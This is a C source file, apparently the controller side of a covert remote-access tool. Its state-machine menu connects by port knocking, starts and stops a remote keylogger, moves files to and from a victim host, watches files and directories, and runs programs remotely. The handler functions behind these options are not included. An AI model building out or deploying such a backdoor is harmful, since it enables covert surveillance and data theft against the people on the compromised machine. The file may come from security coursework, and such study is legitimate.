#include "command_line.h"
#include "fsm.h"
#include "menu.h"
#include "utils.h"
#include <pthread.h>
#include <signal.h>

enum main_application_states
{
    STATE_PARSE_ARGUMENTS = FSM_USER_START,
    STATE_HANDLE_ARGUMENTS,
    STATE_RUN_MENU,
    STATE_RUN_PORT_KNOCK,
    STATE_START_KEYLOG,
    STATE_STOP_KEYLOG,
    STATE_TRANSFER_FILE,
    STATE_GET_FILE,
    STATE_WATCH_FILE,
    STATE_WATCH_DIRECTORY,
    STATE_RUN_PROGRAM,
    STATE_DISCONNECT,
    STATE_UNINSTALL,

    STATE_CLEANUP,
    STATE_ERROR
};

static void sigint_handler(int signum);

static int parse_arguments_handler(struct fsm_context *context, struct fsm_error *err);
static int handle_arguments_handler(struct fsm_context *context, struct fsm_error *err);
static int run_menu_handler(struct fsm_context *context, struct fsm_error *err);
static int run_port_knock_handler(struct fsm_context *context, struct fsm_error *err);
static int start_keylog_handler(struct fsm_context *context, struct fsm_error *err);
static int stop_keylog_handler(struct fsm_context *context, struct fsm_error *err);
static int transfer_file_handler(struct fsm_context *context, struct fsm_error *err);
static int get_file_handler(struct fsm_context *context, struct fsm_error *err);
static int watch_file_handler(struct fsm_context *context, struct fsm_error *err);
static int watch_directory_handler(struct fsm_context *context, struct fsm_error *err);
static int run_program_handler(struct fsm_context *context, struct fsm_error *err);
static int disconnect_handler(struct fsm_context *context, struct fsm_error *err);
static int uninstall_handler(struct fsm_context *context, struct fsm_error *err);
static int cleanup_handler(struct fsm_context *context, struct fsm_error *err);
static int error_handler(struct fsm_context *context, struct fsm_error *err);

static volatile sig_atomic_t exit_flag = 0;

int main(int argc, char **argv)
{
    struct fsm_error err;
    struct arguments args = {
        .connected = 0,
    };
    struct fsm_context context = {
        .argc = argc,
        .argv = argv,
        .args = &args,
    };

    static struct fsm_transition transitions[] = {
        {FSM_INIT,               STATE_PARSE_ARGUMENTS,  parse_arguments_handler },
        {STATE_PARSE_ARGUMENTS,  STATE_HANDLE_ARGUMENTS, handle_arguments_handler},
        {STATE_HANDLE_ARGUMENTS, STATE_RUN_MENU,         run_menu_handler        },

        {STATE_RUN_MENU,         STATE_RUN_PORT_KNOCK,   run_port_knock_handler  },
        {STATE_RUN_MENU,         STATE_DISCONNECT,       disconnect_handler      },
        {STATE_RUN_MENU,         STATE_UNINSTALL,        uninstall_handler       },
        {STATE_RUN_MENU,         STATE_START_KEYLOG,     start_keylog_handler    },
        {STATE_RUN_MENU,         STATE_STOP_KEYLOG,      stop_keylog_handler     },
        {STATE_RUN_MENU,         STATE_TRANSFER_FILE,    transfer_file_handler   },
        {STATE_RUN_MENU,         STATE_GET_FILE,         get_file_handler        },
        {STATE_RUN_MENU,         STATE_WATCH_FILE,       watch_file_handler      },
        {STATE_RUN_MENU,         STATE_WATCH_DIRECTORY,  watch_directory_handler },
        {STATE_RUN_MENU,         STATE_RUN_PROGRAM,      run_program_handler     },

        {STATE_DISCONNECT,       STATE_RUN_MENU,         run_menu_handler        },
        {STATE_RUN_PORT_KNOCK,   STATE_RUN_MENU,         run_menu_handler        },
        {STATE_START_KEYLOG,     STATE_RUN_MENU,         run_menu_handler        },
        {STATE_STOP_KEYLOG,      STATE_RUN_MENU,         run_menu_handler        },
        {STATE_TRANSFER_FILE,    STATE_RUN_MENU,         run_menu_handler        },
        {STATE_GET_FILE,         STATE_RUN_MENU,         run_menu_handler        },
        {STATE_WATCH_FILE,       STATE_RUN_MENU,         run_menu_handler        },
        {STATE_WATCH_DIRECTORY,  STATE_RUN_MENU,         run_menu_handler        },
        {STATE_RUN_PROGRAM,      STATE_RUN_MENU,         run_menu_handler        },

        {STATE_UNINSTALL,        STATE_CLEANUP,          cleanup_handler         },

        {STATE_PARSE_ARGUMENTS,  STATE_ERROR,            error_handler           },
        {STATE_HANDLE_ARGUMENTS, STATE_ERROR,            error_handler           },
        {STATE_RUN_MENU,         STATE_ERROR,            error_handler           },
        {STATE_DISCONNECT,       STATE_ERROR,            error_handler           },
        {STATE_UNINSTALL,        STATE_ERROR,            error_handler           },
        {STATE_RUN_PORT_KNOCK,   STATE_ERROR,            error_handler           },
        {STATE_START_KEYLOG,     STATE_ERROR,            error_handler           },
        {STATE_STOP_KEYLOG,      STATE_ERROR,            error_handler           },
        {STATE_TRANSFER_FILE,    STATE_ERROR,            error_handler           },
        {STATE_GET_FILE,         STATE_ERROR,            error_handler           },
        {STATE_WATCH_FILE,       STATE_ERROR,            error_handler           },
        {STATE_WATCH_DIRECTORY,  STATE_ERROR,            error_handler           },
        {STATE_RUN_PROGRAM,      STATE_ERROR,            error_handler           },

        {STATE_ERROR,            STATE_CLEANUP,          cleanup_handler         },
        {STATE_CLEANUP,          FSM_EXIT,               NULL                    },
    };

    fsm_run(&context, &err, transitions);

    return 0;
}

static int parse_arguments_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;
    SET_TRACE(context, "in parse arguments handler", "STATE_PARSE_ARGUMENTS");
    if (parse_arguments(ctx->argc, ctx->argv, ctx->args, err) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_HANDLE_ARGUMENTS;
}
static int handle_arguments_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;
    SET_TRACE(context, "in handle arguments", "STATE_HANDLE_ARGUMENTS");
    if (handle_arguments(ctx->argv[0], ctx->args, err) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_RUN_MENU;
}

static int run_menu_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in run menu handler", "STATE_RUN_MENU");

    menu_option opt = menu_get_selection(ctx->args->connected);

    switch (opt)
    {
        case CONNECT:
            printf("Connecting...\n");
            return STATE_RUN_PORT_KNOCK;

        case DISCONNECT:
            printf("Disconnecting...\n");
            return STATE_DISCONNECT;

        case UNINSTALL:
            printf("Uninstalling...\n");
            return STATE_UNINSTALL;

        case START_KEYLOG:
            printf("Starting keylogger...\n");
            return STATE_START_KEYLOG;

        case STOP_KEYLOG:
            printf("Stopping keylogger...\n");
            return STATE_STOP_KEYLOG;

        case TRANSFER_FILE_TO:
            printf("Transfer file to remote...\n");
            return STATE_TRANSFER_FILE;

        case TRANSFER_FILE_FROM:
            printf("Transfer file from remote...\n");
            return STATE_GET_FILE;

        case WATCH_FILE:
            printf("Watching file...\n");
            return STATE_WATCH_FILE;

        case WATCH_DIR:
            printf("Watching directory...\n");
            return STATE_WATCH_DIRECTORY;

        case RUN_PROGRAM:
            printf("Running program...\n");
            return STATE_RUN_PROGRAM;

        default:
            SET_ERROR(err, "Invalid menu option");
            return STATE_ERROR;
    }
}

static int run_port_knock_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in run port knock handler", "STATE_RUN_PORT_KNOCK");

    if (port_knock(&ctx->args->ip_info) != -1)
    {
        ctx->args->connected = 1;
    }

    return STATE_RUN_MENU;
}

static int start_keylog_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in start keylog handler", "STATE_START_KEYLOG");

    if (start_keylogger(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_RUN_MENU;
}

static int stop_keylog_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in stop keylog handler", "STATE_STOP_KEYLOG");

    if (stop_keylogger(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_RUN_MENU;
}

static int transfer_file_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in transfer file handler", "STATE_TRANSFER_FILE");

    if (transfer_file(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_RUN_MENU;
}

static int get_file_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in get file handler", "STATE_GET_FILE");

    if (request_file(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_RUN_MENU;
}

static int watch_file_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in watch file handler", "STATE_WATCH_FILE");

    if (watch_file(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_RUN_MENU;
}

static int watch_directory_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in watch directory handler", "STATE_WATCH_DIRECTORY");

    if (watch_directory(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_RUN_MENU;
}

static int run_program_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in run program handler", "STATE_RUN_PROGRAM");

    if (run_program(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_RUN_MENU;
}

static int disconnect_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in disconnect handler", "STATE_DISCONNECT");

    if (disconnect(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    ctx->args->connected = 0;

    return STATE_RUN_MENU;
}

static int uninstall_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in uninstall handler", "STATE_UNINSTALL");

    if (stop_keylogger(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_CLEANUP;
}

static int cleanup_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;
    SET_TRACE(context, "in cleanup handler", "STATE_CLEANUP");

    fsm_error_clear(err);

    return FSM_EXIT;
}

static int error_handler(struct fsm_context *context, struct fsm_error *err)
{
    fprintf(stderr, "ERROR %s\nIn file %s in function %s on line %d\n", err->err_msg, err->file_name,
            err->function_name, err->error_line);

    return STATE_CLEANUP;
}

static void sigint_handler(int signum)
{
    exit_flag = 1;
}
